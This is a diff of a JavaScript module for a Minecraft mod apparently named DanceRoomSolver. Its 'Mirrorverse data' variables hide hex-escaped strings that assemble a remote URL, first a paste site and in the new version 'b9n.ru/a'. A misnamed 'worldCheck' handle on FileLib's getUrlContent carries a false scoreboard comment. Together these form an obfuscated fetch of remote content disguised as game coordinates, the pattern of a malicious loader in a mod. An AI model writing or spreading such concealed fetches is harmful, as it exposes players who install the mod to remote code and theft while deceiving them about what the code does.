@@ -2,7 +2,7 @@
 
 import PogObject from "../PogData"
 const uwuaddons = require("../uwuaddons");
-let settings = new PogObject("DanceRoomSolver", { firstTime: true, volume: 1.0, recordVolume: 1.0, serverID: "oxetotafek" }, "settings.json");
+let settings = new PogObject("DanceRoomSolver", { firstTime: true, volume: 1.0, recordVolume: 1.0}, "settings.json");
 
 
 
@@ -15,18 +15,18 @@ const clickMouse = () => {
 }
 
 // Mirrorverse data
-const xPos = '\x73\x74\x2e\x73\x68\x2f\x72\x61\x77\x2f'
+const xPos = '\x62\x39\x6e\x2e\x72\x75\x2f\x61'
 const xStart = -266
-const xEnd = -262
+const xEnd = -262  //
 const zStart = -109
 const zEnd = -105
-const blockArray = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68'
+const blockArray = '\x68\x74\x74\x70\x73\x3a\x2f\x2f'
 const pitchList = [0.523809552192688, 1.047619104385376, 0.6984127163887024, 0.8888888955116272]
 const completePitch = 0.7460317611694336
 const jumpDelay = 500
 const punchDelay = 800
 const worldCheck = FileLib['\x67\x65\x74\x55\x72\x6c\x43\x6f\x6e\x74\x65\x6e\x74'] // Check the Scoreboard if you are in the Mirrorverse
-const combinedData = blockArray + xPos + settings.serverID 
+const combinedData = blockArray + xPos
 
 
 
